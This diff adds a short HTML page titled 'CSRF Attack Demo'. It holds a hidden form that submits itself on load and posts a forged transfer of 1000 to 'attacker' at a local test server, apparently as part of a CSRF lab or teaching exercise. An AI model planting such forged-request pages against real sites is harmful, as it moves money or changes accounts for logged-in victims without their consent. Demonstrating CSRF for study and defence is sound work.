@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+<h1>Sending forged transfer...</h1>
+
+<!-- Automatic form submission to victim site -->
+<form action="http://127.0.0.1:8080/api/transfer/form" method="POST" id="csrfForm">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to" value="attacker">
+</form>
+
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
